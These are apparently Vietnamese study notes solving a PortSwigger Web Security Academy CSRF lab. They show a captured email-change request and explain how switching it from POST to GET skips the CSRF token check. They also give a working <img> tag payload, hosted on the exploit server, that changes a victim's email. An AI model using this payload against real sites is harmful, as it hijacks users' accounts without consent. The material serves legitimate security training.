

![[Pasted image 20260926220908.png]]
-Phân tích
- [ ] Mục tiêu chính: Thay đổi địa chỉ email của người xem (victim) thông qua lỗ hổng CSRF.
 - [ ] Đối tượng tấn công: Chức năng thay đổi email (Email change functionality).
- [ ] Điểm yếu bảo mật: Server có cố gắng chống CSRF nhưng chỉ áp dụng phòng vệ cho một số loại request nhất định (thường là chỉ kiểm tra token với POST mà bỏ qua GET, hoặc ngược lại).
- [ ] Công cụ khai thác: Sử dụng Exploit Server của PortSwigger để host trang HTML chứa payload.
- [ ] Thông tin đăng nhập để test: Tài khoản wiener / mật khẩu peter.
- [ ] Điều kiện hoàn thành (Solved): Khi victim truy cập trang exploit, email của họ bị thay đổi thành công mà không cần họ bấm nút.
-
![[Pasted image 20260926230828.png]]
-trong request form đăng nhập, có csrs token

> [!NOTE]
> POST /my-account/change-email HTTP/2
> Host: 0af4004d0304d32680ff031e00fe00e5.web-security-academy.net
> Cookie: session=vht29mxDYpc0LhZrNOjF7iFX8Jdywpqh
> Content-Length: 60
> Cache-Control: max-age=0
> Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
> Sec-Ch-Ua-Mobile: ?0
> Sec-Ch-Ua-Platform: "Linux"
> Accept-Language: en-US,en;q=0.9
> Upgrade-Insecure-Requests: 1
> Content-Type: application/x-www-form-urlencoded
> User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
> ==Origin==: https://0af4004d0304d32680ff031e00fe00e5.web-security-academy.net
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
> Sec-Fetch-Site: same-origin
> Sec-Fetch-Mode: navigate
> Sec-Fetch-User: ?1
> Sec-Fetch-Dest: document
> Referer: https://0af4004d0304d32680ff031e00fe00e5.web-security-academy.net/my-account?id=wiener
> Accept-Encoding: gzip, deflate, br
> Priority: u=0, i
> 
> email=haha%40gmail.com&==csrf=fUQuPFCwVBD3jE8LdE9xpRh9N3E8e9hf==

-lab này nó bảo luôn là csrf token ko tác dụng với các request method khác
-chuyển cái POST sang GET 
![[Pasted image 20260926232211.png]]
-> nó found-> bỏ đi được csrf token, nó vẫn nhận được request-> fake được request.Nhưng vấn đề là oirgin, chắc cái lab này nó cũng ko check tiếp
![[Pasted image 20260926233218.png]]

-tiếp tục viết html và host nó lên exploit website, sau đó kiểm chứng xem nó có gưiwr được fake request thật ko
```
<img src="https://0af4004d0304d32680ff031e00fe00e5.web-security-academy.net/my-account/change-email?email=ha%40gmail.com">
```
=> cái này hoạt động trên máy mình , nhưng ko hiểu sao ko hoạt động trên máy victim==> có lẽ do trường origin
==> à ko phải cuối cùng cũng solve, do lỗi hiển thị thôi


> [!NOTE] có thay được origin trong fake request ko
> Trình duyệt luôn tự động gán `Origin` và `Referer` dựa trên **trang web của kẻ tấn công** (Exploit Server). Khi victim mở trang exploit của bạn, trình duyệt sẽ gửi:
> 
> - `Referer: https://exploit-...exploit-server.net/`
>     
> - `Origin: https://exploit-...exploit-server.net`
>     
> 
> Bạn không thể dùng JavaScript hay HTML để sửa nó thành domain của victim được (nếu làm được thì CSRF đã không còn là lỗ hổng).

